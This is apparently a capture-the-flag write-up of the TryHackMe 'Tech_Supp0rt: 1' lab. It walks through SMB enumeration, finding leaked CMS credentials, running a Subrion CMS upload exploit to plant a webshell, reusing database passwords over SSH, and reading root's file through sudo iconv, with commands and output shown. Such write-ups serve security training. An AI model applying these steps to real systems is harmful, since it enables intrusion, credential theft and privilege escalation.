---
layout: post
author: L0
---

# THM-Tech_Supp0rt-1

![image](/images/Pasted image 20230820221846.png)

[TryHackMe - Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1)

## Enumeration
### nmap
```shell
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- **Port 22:** SSH service
- **Port 80:** Apache web server
- **Port 139 & 445:** SMB service
### SMB Enumeration with enum4linux

running *enum4linux* returned some useful information.

```shell
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP

[+] Attempting to map shares on 10.10.15.183

//10.10.15.183/print$   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.15.183/websvrs   Mapping: OK Listing: OK Writing: N/A

```

- `//10.10.15.183/websvrs` provides directory listing.

```shell
[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''

S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\scamsite (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

```

- Multiple user identifications were discovered.

```shell
$ smbclient //10.10.15.183/websvr
Password for [WORKGROUP\j0j0pupp3]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5678712 blocks available
```

```shell
$ cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```

From the SMB share, a file named `enter.txt` was obtained, which contained goals and credentials for a CMS called Subrion. However, a direct route to `http://techsupport/subrion` was unavailable.
### Reverse Shell

```shell
$ ffuf -w `fzf-wordlist` -u http://techsupport.thm/subrion/FUZZ -fc 301,302

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2736ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3937ms]
favicon.ico             [Status: 200, Size: 1150, Words: 10, Lines: 4, Duration: 50ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4749ms]
robots.txt              [Status: 200, Size: 142, Words: 9, Lines: 8, Duration: 40ms]
sitemap.xml             [Status: 200, Size: 628, Words: 6, Lines: 4, Duration: 40ms]
updates                 [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 37ms]

```

i did a directory fuzzing and found access to the *robots.txt*

![image](/images/Pasted image 20230820233330.png)

and from there we got a working path to the login page.

![image](/images/Pasted image 20230820233411.png)

After reversing an encoded password:

![image](/images/Pasted image 20230821084250.png)

in the dashboard i found nothing special and i searched for an exploit for the specific version.

![image](/images/Pasted image 20230820234045.png)

i found one and executed it with this command.

```shell
$ python3 subrion_exp.py -u "http://techsupport.thm/subrion/panel/" -l "admin" -p "Scam2021"
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://techsupport.thm/subrion/panel/
[+] Success!
[+] Got CSRF token: WqbKikR2wG83lqldtjG4OanA6CY52P7AtKaSuxju
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: ufzltrelacqmobd

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://techsupport.thm/subrion/panel/uploads/ufzltrelacqmobd.phar

$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

This resulted in shell access.
## Privilege Escalation
i found some credentials in the wordpress directory.

```shell
$ cat ../../wordpress/wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
...
```

and with those i was able to connect with ssh as the user *scamsite* (we got this one from enum4linux or /etc/passwd)

```shell
$ ssh scamsite@techsupport
scamsite@techsupport's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Fri May 28 23:30:20 2021
scamsite@TechSupport:~$ ls
websvr
scamsite@TechSupport:~$ id
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```

Checking for elevated privileges revealed that the `iconv` binary could be executed with sudo rights:

```shell
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv

```

`iconv` is a binary that converts one encoding to another.
so reading */root/root.txt* was easy.

```shell
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
851**********************************90b  -
```

and i got the flag.

[L0]